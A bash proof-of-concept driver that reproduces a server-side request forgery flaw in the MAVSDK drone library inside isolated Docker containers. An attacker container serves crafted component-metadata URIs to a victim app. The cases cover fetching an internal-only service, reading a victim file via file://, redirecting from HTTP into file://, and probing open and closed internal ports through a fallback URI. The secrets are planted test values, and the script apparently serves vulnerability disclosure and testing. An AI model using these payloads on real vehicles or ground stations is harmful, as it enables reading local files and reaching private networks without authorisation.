#!/usr/bin/env bash
# MAVSDK-01 reproduction driver. Three containers on two networks so the
# internal target is genuinely unreachable from the attacker.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
# The image is the one built by MAVSDK-03's Dockerfile: it installs the shipped
# libmavsdk-dev 3.17.4 .deb. Build it there first if it does not exist.
IMG=mavsdk03-poc
cleanup() {
  docker rm -f m1atk m1victim m1int >/dev/null 2>&1 || true
  docker network rm m1pub m1int >/dev/null 2>&1 || true
}
cleanup
docker network create m1pub >/dev/null
docker network create m1int >/dev/null

# --- the internal service: on m1int only, so the attacker has no route to it ---
docker run -d --name m1int --network m1int --network-alias internal-svc $IMG bash -lc '
mkdir -p /srv && cd /srv
echo "{\"internal_only\":\"secret-9f3a-do-not-leak\"}" > secret.json
python3 -m http.server 8080' >/dev/null
sleep 2

run_case() {
  local label="$1" uri="$2" general="${3:-}"
  echo
  echo "############ $label"
  docker rm -f m1atk m1victim >/dev/null 2>&1 || true
  local gopt=()
  [ -n "$general" ] && gopt=(--serve-general "$general")
  docker run -d --name m1atk --network m1pub --network-alias attacker \
    -v "$HERE:/probe:ro" \
    $IMG python3 /probe/probe_ssrf.py --uri "$uri" --seconds 35 "${gopt[@]}" >/dev/null
  sleep 4
  docker run -d --name m1victim --network m1pub \
    -v "$HERE:/probe:ro" $IMG bash -lc '
      echo "TOPSECRET-victim-side-bench-token-4c1d" > /etc/mavsdk-bench-secret.txt
      g++ -O2 -std=c++17 -I/usr/include/mavsdk -o /usr/local/bin/events_app /probe/events_app.cpp -lmavsdk 2>/dev/null
      MAVSDK_COMPONENT_METADATA_DEBUGGING=1 events_app tcpout://attacker:5760 25' >/dev/null
  docker network connect m1int m1victim
  sleep 30
  echo "--- victim (MAVSDK) ---"
  docker logs m1victim 2>&1 | grep -Ei "Downloading json|download (finished|failed|ended)|curl|Failed to parse|cached|metadata" | sed 's/^/   /' | head -14
  echo "--- attacker HTTP hits ---"
  docker logs m1atk 2>&1 | grep -E "HTTP hit|answered|302|HITS=" | sed 's/^/   /'
  echo "--- victim cache ---"
  docker exec m1victim sh -c 'find /root/.cache -name "*.cache" -exec sh -c "echo \"   {}\"; head -c 120 {}; echo" \;' 2>/dev/null || echo "   (none)"
}

echo "############ libcurl protocol set in the shipped image"
docker run --rm $IMG sh -c 'curl --version | head -2' | sed 's/^/   /'

echo
echo "############ can the ATTACKER reach the internal service?"
docker run --rm --network m1pub $IMG sh -c \
  'curl -s -m 5 http://internal-svc:8080/secret.json && echo REACHED || echo "   attacker cannot reach internal-svc (exit $?)"' | sed 's/^/   /'
echo "############ can a host ON m1int reach it?"
docker run --rm --network m1int $IMG sh -c \
  'curl -s -m 5 http://internal-svc:8080/secret.json' | sed 's/^/   /'

run_case "CASE 1 — SSRF: fetch an internal service the attacker has no route to" \
         "http://internal-svc:8080/secret.json"

run_case "CASE 2 — file:// read of a victim-side file" \
         "file:///etc/mavsdk-bench-secret.txt"

run_case "CASE 3 — HTTP 302 redirect into file:// (FOLLOWLOCATION is on)" \
         "http://attacker:8080/redirect-to-file"

run_case "CASE 4a — oracle, primary points at an OPEN internal port" \
         "http://attacker:8080/general.json" \
         '{"version":1,"metadataTypes":[{"type":1,"uri":"http://internal-svc:8080/secret.json","uriFallback":"http://attacker:8080/FALLBACK-FIRED-open"}]}'

run_case "CASE 4b — oracle, primary points at a CLOSED internal port" \
         "http://attacker:8080/general.json" \
         '{"version":1,"metadataTypes":[{"type":1,"uri":"http://internal-svc:9999/nothing","uriFallback":"http://attacker:8080/FALLBACK-FIRED-closed"}]}'

cleanup
